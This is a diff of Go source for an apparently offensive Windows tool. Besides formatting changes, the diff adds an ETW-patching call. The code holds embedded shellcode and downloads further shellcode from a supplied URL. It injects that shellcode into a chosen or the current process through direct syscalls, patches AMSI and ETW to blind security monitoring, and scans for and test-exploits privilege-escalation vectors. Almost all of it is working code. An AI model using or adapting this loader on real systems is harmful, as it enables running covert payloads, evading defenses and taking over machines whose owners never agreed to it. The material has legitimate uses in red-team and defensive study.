@@ -13,8 +13,10 @@ import (
 	"strings"
 	"time"
 	"unsafe"
+
 	winapi "github.com/carved4/go-native-syscall"
 	"github.com/carved4/go-native-syscall/pkg/debug"
+	"github.com/carved4/go-native-syscall/pkg/syscall"
 )
 
 // i made this project for go 1.20 and im sticking with it i cannot believe there is no built in min function pre 1.21
@@ -28,7 +30,7 @@ func min(a, b int) int {
 // calc shellcode :3
 func getEmbeddedShellcode() []byte {
 	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
-	
+
 	// Convert hex string to bytes
 	bytes := make([]byte, len(hexString)/2)
 	for i := 0; i < len(hexString); i += 2 {
@@ -38,7 +40,6 @@ func getEmbeddedShellcode() []byte {
 	return bytes
 }
 
-
 // Process information structure
 type ProcessInfo struct {
 	Pid  uint32
@@ -47,10 +48,10 @@ type ProcessInfo struct {
 
 // SyscallDumpResult represents the complete syscall dump for JSON export
 type SyscallDumpResult struct {
-	Timestamp   string                     `json:"timestamp"`
-	SystemInfo  SystemInfo                 `json:"system_info"`
-	Syscalls    []winapi.SyscallInfo       `json:"syscalls"`
-	TotalCount  int                        `json:"total_count"`
+	Timestamp  string               `json:"timestamp"`
+	SystemInfo SystemInfo           `json:"system_info"`
+	Syscalls   []winapi.SyscallInfo `json:"syscalls"`
+	TotalCount int                  `json:"total_count"`
 }
 
 // SystemInfo holds basic system information for the dump
@@ -66,25 +67,25 @@ func downloadPayload(url string) ([]byte, error) {
 	client := &http.Client{
 		Timeout: 30 * 1000000000, // 30 seconds
 	}
-	
+
 	// Make the request
 	resp, err := client.Get(url)
 	if err != nil {
 		return nil, fmt.Errorf("failed to download payload: %v", err)
 	}
 	defer resp.Body.Close()
-	
+
 	// Check response code
 	if resp.StatusCode != http.StatusOK {
 		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
 	}
-	
+
 	// Read the payload
 	payload, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, fmt.Errorf("failed to read payload: %v", err)
 	}
-	
+
 	fmt.Printf("Downloaded %d bytes of shellcode\n", len(payload))
 	return payload, nil
 }
@@ -94,7 +95,7 @@ func utf16ToString(ptr *uint16, maxLen int) string {
 	if ptr == nil {
 		return ""
 	}
-	
+
 	var result []uint16
 	for i := 0; i < maxLen; i++ {
 		char := *(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + uintptr(i)*2))
@@ -103,7 +104,7 @@ func utf16ToString(ptr *uint16, maxLen int) string {
 		}
 		result = append(result, char)
 	}
-	
+
 	// Simple conversion for ASCII characters
 	var str strings.Builder
 	for _, char := range result {
@@ -126,15 +127,15 @@ func getProcessList() ([]ProcessInfo, error) {
 		0,
 		&returnLength,
 	)
-	
+
 	if status != winapi.STATUS_INFO_LENGTH_MISMATCH && status != winapi.STATUS_BUFFER_TOO_SMALL {
 		return nil, fmt.Errorf("failed to get buffer size: %s", winapi.FormatNTStatus(status))
 	}
-	
+
 	// Allocate buffer with some extra space
 	bufferSize := returnLength + 4096
 	buffer := make([]byte, bufferSize)
-	
+
 	// Second call to get actual data
 	status, err = winapi.NtQuerySystemInformation(
 		winapi.SystemProcessInformation,
@@ -142,34 +143,34 @@ func getProcessList() ([]ProcessInfo, error) {
 		bufferSize,
 		&returnLength,
 	)
-	
+
 	if err != nil {
 		return nil, fmt.Errorf("NtQuerySystemInformation error: %v", err)
 	}
-	
+
 	if status != winapi.STATUS_SUCCESS {
 		return nil, fmt.Errorf("NtQuerySystemInformation failed: %s", winapi.FormatNTStatus(status))
 	}
-	
+
 	var processes []ProcessInfo
 	offset := uintptr(0)
 	processCount := 0
-	
+
 	for {
 		// Safety check to prevent buffer overflow
 		if offset >= uintptr(len(buffer)) {
 			break
 		}
-		
+
 		// Get current process entry
 		processInfo := (*winapi.SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(&buffer[offset]))
 		processCount++
-		
+
 		// Extract process name from UNICODE_STRING
 		var processName string
 		if processInfo.ImageName.Buffer != nil && processInfo.ImageName.Length > 0 {
 			maxChars := int(processInfo.ImageName.Length / 2) // Length is in bytes, convert to chars
-			if maxChars > 260 { // MAX_PATH protection
+			if maxChars > 260 {                               // MAX_PATH protection
 				maxChars = 260
 			}
 			processName = utf16ToString(processInfo.ImageName.Buffer, maxChars)
@@ -181,9 +182,7 @@ func getProcessList() ([]ProcessInfo, error) {
 				processName = fmt.Sprintf("Process_%d", processInfo.UniqueProcessId)
 			}
 		}
-		
 
-		
 		// Skip System Idle Process (PID 0) but include all others
 		if processInfo.UniqueProcessId != 0 && processName != "" {
 			// Try to open the process to check if we have access
@@ -193,12 +192,12 @@ func getProcessList() ([]ProcessInfo, error) {
 				UniqueProcess: processInfo.UniqueProcessId,
 				UniqueThread:  0,
 			}
-			
+
 			// Initialize OBJECT_ATTRIBUTES to NULL equivalent
 			objAttrs := winapi.OBJECT_ATTRIBUTES{
 				Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
 			}
-			
+
 			// Try with limited access first
 			status, _ := winapi.NtOpenProcess(
 				&processHandle,
@@ -206,7 +205,7 @@ func getProcessList() ([]ProcessInfo, error) {
 				uintptr(unsafe.Pointer(&objAttrs)),
 				uintptr(unsafe.Pointer(&clientId)),
 			)
-			
+
 			// If that fails, try with even more limited access
 			if status != winapi.STATUS_SUCCESS {
 				status, _ = winapi.NtOpenProcess(
@@ -216,15 +215,13 @@ func getProcessList() ([]ProcessInfo, error) {
 					uintptr(unsafe.Pointer(&clientId)),
 				)
 			}
-			
+
 			// If that still fails, just add the process anyway (we know it exists)
 
 			if status == winapi.STATUS_SUCCESS {
 				winapi.NtClose(processHandle)
 			}
-			
 
-			
 			// Add process to list even if we can't access it for injection
 			// We'll check access again when actually trying to inject
 			processes = append(processes, ProcessInfo{
@@ -232,21 +229,19 @@ func getProcessList() ([]ProcessInfo, error) {
 				Name: processName,
 			})
 		}
-		
+
 		// Move to next entry
 		if processInfo.NextEntryOffset == 0 {
 			break
 		}
 		offset += uintptr(processInfo.NextEntryOffset)
 	}
-	
 
-	
 	// Sort processes by name for easier readability
 	sort.Slice(processes, func(i, j int) bool {
 		return processes[i].Name < processes[j].Name
 	})
-	
+
 	return processes, nil
 }
 
@@ -258,33 +253,33 @@ func isProcessRunning(pid uint32) error {
 		UniqueProcess: uintptr(pid),
 		UniqueThread:  0,
 	}
-	
+
 	// Initialize OBJECT_ATTRIBUTES properly
 	objAttrs := winapi.OBJECT_ATTRIBUTES{
 		Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
 	}
-	
+
 	status, err := winapi.NtOpenProcess(
 		&processHandle,
 		winapi.PROCESS_QUERY_LIMITED_INFORMATION,
 		uintptr(unsafe.Pointer(&objAttrs)),
 		uintptr(unsafe.Pointer(&clientId)),
 	)
-	
+
 	if err != nil {
 		return fmt.Errorf("failed to open process for verification: %v", err)
 	}
-	
+
 	if status != winapi.STATUS_SUCCESS {
 		return fmt.Errorf("failed to open process: %s", winapi.FormatNTStatus(status))
 	}
-	
+
 	defer winapi.NtClose(processHandle)
-	
+
 	// Query basic process information
 	var processInfo winapi.PROCESS_BASIC_INFORMATION
 	var returnLength uintptr
-	
+
 	status, err = winapi.NtQueryInformationProcess(
 		processHandle,
 		winapi.ProcessBasicInformation,
@@ -292,26 +287,22 @@ func isProcessRunning(pid uint32) error {
 		unsafe.Sizeof(processInfo),
 		&returnLength,
 	)
-	
+
 	if err != nil {
 		return fmt.Errorf("failed to query process information: %v", err)
 	}
-	
+
 	if status != winapi.STATUS_SUCCESS {
 		return fmt.Errorf("process query failed: %s", winapi.FormatNTStatus(status))
 	}
-	
+
 	// If we can query the process, it's running
 	// The ExitStatus would be non-zero if the process had exited
 	return nil
 }
 
-
-
-
-
 func main() {
-	// Enable debug mode by default for unhooking
+	winapi.PatchETW()
 	debug.SetDebugMode(true)
 	debug.Printfln("MAIN", "Starting unhooking process...\n")
 
@@ -326,12 +317,11 @@ func main() {
 		debug.Printfln("MAIN", "Warning: Failed to prewarm cache: %v\n", cacheErr)
 	}
 
-	
 	// Display cache statistics
 	stats := winapi.GetSyscallCacheStats()
-	debug.Printfln("MAIN", "Syscall cache initialized - Size: %v, Algorithm: %v\n", 
+	debug.Printfln("MAIN", "Syscall cache initialized - Size: %v, Algorithm: %v\n",
 		stats["cache_size"], stats["hash_algorithm"])
-	
+
 	// Parse command line flags
 	urlFlag := flag.String("url", "", "URL to download shellcode from")
 	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode (uses self-injection by default)")
@@ -352,8 +342,8 @@ func main() {
 	// Check if privesc flag is used
 	if *privescFlag {
 		debug.Printfln("MAIN", "Starting privilege escalation vector scan and testing...\n")
-		debug.Printfln("MAIN", "%s\n", "=" + strings.Repeat("=", 79))
-		
+		debug.Printfln("MAIN", "%s\n", "="+strings.Repeat("=", 79))
+
 		// Scan for privilege escalation vectors
 		debug.Printfln("MAIN", "Scanning for privilege escalation vectors...\n")
 		escMap, err := winapi.ScanPrivilegeEscalationVectors()
@@ -361,19 +351,18 @@ func main() {
 			debug.Printfln("MAIN", "Failed to scan vectors: %v\n", err)
 			os.Exit(1)
 		}
-		
+
 		// Display summary
 		debug.Printfln("MAIN", "\n=== Privilege Escalation Scan Results ===\n")
 		debug.Printfln("MAIN", "Total vectors found: %d\n", escMap.Summary.TotalVectors)
-		debug.Printfln("MAIN", "Critical: %d, High: %d, Medium: %d, Low: %d\n", 
-			escMap.Summary.CriticalCount, escMap.Summary.HighCount, 
+		debug.Printfln("MAIN", "Critical: %d, High: %d, Medium: %d, Low: %d\n",
+			escMap.Summary.CriticalCount, escMap.Summary.HighCount,
 			escMap.Summary.MediumCount, escMap.Summary.LowCount)
 		debug.Printfln("MAIN", "Exploitable vectors: %d\n", escMap.Summary.ExploitableCount)
-		
+
 		if escMap.Summary.TotalVectors > 0 {
 			// Display vector details
 			debug.Printfln("MAIN", "\n=== Vector Details ===\n")
-			
 
 			if len(escMap.BinaryPlanting) > 0 {
 				debug.Printfln("MAIN", "Binary Planting (%d):\n", len(escMap.BinaryPlanting))
@@ -381,30 +370,30 @@ func main() {
 					debug.Printfln("MAIN", "  [%s] %s - %s\n", v.Severity, v.Path, v.Description)
 				}
 			}
-			
+
 			if len(escMap.ServiceReplace) > 0 {
 				debug.Printfln("MAIN", "Service Replace (%d):\n", len(escMap.ServiceReplace))
 				for _, v := range escMap.ServiceReplace[:min(5, len(escMap.ServiceReplace))] {
 					debug.Printfln("MAIN", "  [%s] %s - %s\n", v.Severity, v.Path, v.Description)
 				}
 			}
-			
+
 			if len(escMap.TaskScheduler) > 0 {
 				debug.Printfln("MAIN", "Task Scheduler (%d):\n", len(escMap.TaskScheduler))
 				for _, v := range escMap.TaskScheduler[:min(5, len(escMap.TaskScheduler))] {
 					debug.Printfln("MAIN", "  [%s] %s - %s\n", v.Severity, v.Path, v.Description)
 				}
 			}
-			
+
 			// Test exploitation in safe mode (no files created)
 			debug.Printfln("MAIN", "\n=== Testing Exploitation Vectors (Safe Mode) ===\n")
-			testPayload := []byte{} 
+			testPayload := []byte{}
 			session := winapi.AutoExploit(escMap, testPayload, true) // testMode = true
-			
+
 			debug.Printfln("MAIN", "Exploitation test results:\n")
-			debug.Printfln("MAIN", "Tested: %d, Success: %d, Failed: %d\n", 
+			debug.Printfln("MAIN", "Tested: %d, Success: %d, Failed: %d\n",
 				session.Tested, session.Success, session.Failed)
-			
+
 			if len(session.Results) > 0 {
 				debug.Printfln("MAIN", "\nTest Details:\n")
 				for i, result := range session.Results[:min(10, len(session.Results))] {
@@ -412,25 +401,23 @@ func main() {
 					if result.Success {
 						status = "PASS"
 					}
-					debug.Printfln("MAIN", "%d. [%s] %s (%s) - %s\n", 
+					debug.Printfln("MAIN", "%d. [%s] %s (%s) - %s\n",
 						i+1, status, result.Vector.Path, result.Method, result.Description)
 				}
 			}
 		} else {
 			debug.Printfln("MAIN", "No privilege escalation vectors found.\n")
 		}
-		
+
 		debug.Printfln("MAIN", "\n✓ Privilege escalation scan completed\n")
 		return
 	}
 
-
-
 	// Check if dump flag is used
 	if *dumpFlag {
 		debug.Printfln("MAIN", "Dumping all available syscalls from ntdll.dll...\n")
-		debug.Printfln("MAIN", "%s\n", "=" + strings.Repeat("=", 79))
-		
+		debug.Printfln("MAIN", "%s\n", "="+strings.Repeat("=", 79))
+
 		// Demonstrate NT Status code formatting
 		debug.Printfln("MAIN", "\nNT Status Code Examples:\n")
 		debug.Printfln("MAIN", "------------------------\n")
@@ -444,18 +431,18 @@ func main() {
 			0xC0000005, // STATUS_ACCESS_VIOLATION
 			0xC000001C, // STATUS_INVALID_PARAMETER_1
 		}
-		
+
 		for _, status := range exampleStatuses {
 			debug.Printfln("MAIN", "  %s\n", winapi.FormatNTStatus(status))
 		}
 		debug.Printfln("MAIN", "\n")
-		
+
 		syscalls, err := winapi.DumpAllSyscallsWithFiles()
 		if err != nil {
 			debug.Printfln("MAIN", "Failed to dump syscalls: %v\n", err)
 			os.Exit(1)
 		}
-		
+
 		// Prewarm the ntdll function cache and display statistics
 		debug.Printfln("MAIN", "Prewarming ntdll function cache...\n")
 		err = winapi.PrewarmNtdllCache()
@@ -469,23 +456,23 @@ func main() {
 			debug.Printfln("MAIN", "  - Regular functions: %d\n", stats["regular_func_count"])
 			debug.Printfln("MAIN", "  - Cache enabled: %v\n", stats["cache_enabled"])
 		}
-		
+
 		// Sort syscalls by syscall number for better readability
 		sort.Slice(syscalls, func(i, j int) bool {
 			return syscalls[i].SyscallNumber < syscalls[j].SyscallNumber
 		})
-		
+
 		// Display to console
 		debug.Printfln("MAIN", "%-4s %-40s %-12s %-16s\n", "SSN", "Function Name", "Hash", "Address")
 		debug.Printfln("MAIN", "%-4s %-40s %-12s %-16s\n", strings.Repeat("-", 4), strings.Repeat("-", 40), strings.Repeat("-", 12), strings.Repeat("-", 16))
-		
+
 		for _, sc := range syscalls {
-			debug.Printfln("MAIN", "%-4d %-40s 0x%-10X 0x%-14X\n", 
+			debug.Printfln("MAIN", "%-4d %-40s 0x%-10X 0x%-14X\n",
 				sc.SyscallNumber, sc.Name, sc.Hash, sc.Address)
 		}
-		
+
 		debug.Printfln("MAIN", "\nTotal syscalls found: %d\n", len(syscalls))
-		
+
 		// Prepare data for JSON export
 		ntdllBase := "0x0"
 		if len(syscalls) > 0 {
@@ -495,7 +482,7 @@ func main() {
 			baseAddr := firstAddr &^ 0xFFFF
 			ntdllBase = fmt.Sprintf("0x%X", baseAddr)
 		}
-		
+
 		dumpResult := SyscallDumpResult{
 			Timestamp: time.Now().Format("2006-01-02T15:04:05Z07:00"),
 			SystemInfo: SystemInfo{
@@ -506,24 +493,24 @@ func main() {
 			Syscalls:   syscalls,
 			TotalCount: len(syscalls),
 		}
-		
+
 		// Generate filename with timestamp
 		filename := fmt.Sprintf("syscall_dump_%s.json", time.Now().Format("20060102_150405"))
-		
+
 		// Marshal to JSON with proper indentation
 		jsonData, err := json.MarshalIndent(dumpResult, "", "  ")
 		if err != nil {
 			debug.Printfln("MAIN", "Failed to marshal JSON: %v\n", err)
 			os.Exit(1)
 		}
-		
+
 		// Write to file
 		err = os.WriteFile(filename, jsonData, 0644)
 		if err != nil {
 			debug.Printfln("MAIN", "Failed to write JSON file: %v\n", err)
 			os.Exit(1)
 		}
-		
+
 		debug.Printfln("MAIN", "\n✓ Syscall dump saved to: %s\n", filename)
 		debug.Printfln("MAIN", "✓ File size: %.2f KB\n", float64(len(jsonData))/1024)
 		return
@@ -554,7 +541,7 @@ func main() {
 			fmt.Println("  ./go-direct-syscall.exe -debug -example                                       # Self injection with debug logging")
 			os.Exit(1)
 		}
-		
+
 		// Download the payload
 		payload, err = downloadPayload(url)
 		if err != nil {
@@ -563,15 +550,15 @@ func main() {
 			return
 		}
 	}
-	
+
 	// Determine injection method: self-injection or remote injection
 	// If -self is explicitly used, force self-injection
 	// If -remote is used with -example, do remote injection
 	// Otherwise, -example defaults to self-injection
 	useSelfInjection := (*exampleFlag && !*remoteFlag) || *selfFlag
-	
+
 	var selectedProcess ProcessInfo
-	
+
 	if useSelfInjection {
 		debug.Printfln("MAIN", "Using self-injection mode\n")
 	} else {
@@ -581,7 +568,7 @@ func main() {
 			debug.Printfln("MAIN", "Failed to get process list: %v\n", err)
 			return
 		}
-		
+
 		// Filter out system processes for cleaner user experience
 		systemProcesses := []string{
 			"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe",
@@ -594,7 +581,7 @@ func main() {
 			"wmiprvse.exe", "vssvc.exe", "registry", "secure system",
 			"lsaiso.exe", "credentialenrollmentmanager.exe", "compkgsrv.exe",
 		}
-		
+
 		var processes []ProcessInfo
 		for _, proc := range allProcesses {
 			isSystem := false
@@ -608,78 +595,78 @@ func main() {
 				processes = append(processes, proc)
 			}
 		}
-		
+
 		if len(processes) == 0 {
 			debug.Printfln("MAIN", "No user processes found.\n")
 			return
 		}
-		
+
 		fmt.Printf("Using remote injection mode - showing %d user processes\n", len(processes))
-		
+
 		// Display process list for manual selection
 		fmt.Printf("\nAvailable processes:\n")
 		fmt.Printf("-------------------\n")
 		for i, proc := range processes {
 			fmt.Printf("[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
 		}
-		
+
 		// Prompt user to select a process
 		var selectedIndex int
 		var processHandle uintptr
 		var status uintptr
-		
+
 		for {
 			fmt.Printf("\nEnter process number to inject into (or 'q' to quit): ")
 			scanner := bufio.NewScanner(os.Stdin)
 			if scanner.Scan() {
 				input := strings.TrimSpace(scanner.Text())
-				
+
 				// Check for quit command
 				if input == "q" || input == "Q" {
 					fmt.Println("Operation cancelled by user")
 					return
 				}
-				
+
 				// Parse the input
 				index, err := strconv.Atoi(input)
 				if err != nil || index < 1 || index > len(processes) {
 					fmt.Printf("Invalid selection. Please enter a number between 1 and %d\n", len(processes))
 					continue
 				}
-				
+
 				selectedIndex = index - 1
 				selectedProcess = processes[selectedIndex]
-				
+
 				// Try to open the process to verify access
 				clientId := winapi.CLIENT_ID{
 					UniqueProcess: uintptr(selectedProcess.Pid),
 					UniqueThread:  0,
 				}
-				
+
 				objAttrs := winapi.OBJECT_ATTRIBUTES{
 					Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
 				}
-				
+
 				desiredAccess := uintptr(winapi.PROCESS_CREATE_THREAD | winapi.PROCESS_VM_OPERATION | winapi.PROCESS_VM_WRITE | winapi.PROCESS_VM_READ | winapi.PROCESS_QUERY_INFORMATION)
-				
+
 				status, err = winapi.NtOpenProcess(
 					&processHandle,
 					desiredAccess,
 					uintptr(unsafe.Pointer(&objAttrs)),
 					uintptr(unsafe.Pointer(&clientId)),
 				)
-				
+
 				if status == winapi.STATUS_SUCCESS {
 					break // Successfully opened process, proceed with injection
 				}
-				
+
 				// Handle access denied or other errors
 				if status == winapi.STATUS_ACCESS_DENIED {
 					fmt.Printf("\nAccess denied to process %s (PID: %d). Please select a different process.\n", selectedProcess.Name, selectedProcess.Pid)
 				} else {
 					fmt.Printf("\nFailed to open process %s (PID: %d): %s\n", selectedProcess.Name, selectedProcess.Pid, winapi.FormatNTStatus(status))
 				}
-				
+
 				// Re-display the process list for convenience
 				fmt.Printf("\nAvailable processes:\n")
 				fmt.Printf("-------------------\n")
@@ -688,27 +675,27 @@ func main() {
 				}
 				continue
 			}
-			
+
 			if err := scanner.Err(); err != nil {
 				fmt.Printf("Error reading input: %v\n", err)
 				return
 			}
 		}
-		
+
 		// Successfully selected and opened process
 		fmt.Printf("\nSelected: [%d] %s (PID: %d)\n", selectedIndex+1, selectedProcess.Name, selectedProcess.Pid)
-		
+
 		// Ensure we close the process handle when done
 		defer winapi.NtClose(processHandle)
-		
+
 		// Remote injection - first need to open the process
 		fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
 		fmt.Printf("Payload size: %d bytes\n", len(payload))
-		
-		// Call remote injection func and patch amsi/etw 
+
+		// Call remote injection func and patch amsi/etw
 		winapi.ApplyAllPatches()
 		err = winapi.NtInjectRemote(processHandle, payload)
-		
+
 		if err != nil {
 			fmt.Printf("Remote injection failed: %v\n", err)
 		} else {
@@ -723,7 +710,7 @@ func main() {
 		// Self-injection
 		debug.Printfln("MAIN", "Injecting payload into current process (self-injection)\n")
 		err = winapi.NtInjectSelfShellcodeIndirect(payload)
-		
+
 		if err != nil {
 			debug.Printfln("MAIN", "Self-injection failed: %v\n", err)
 		} else {
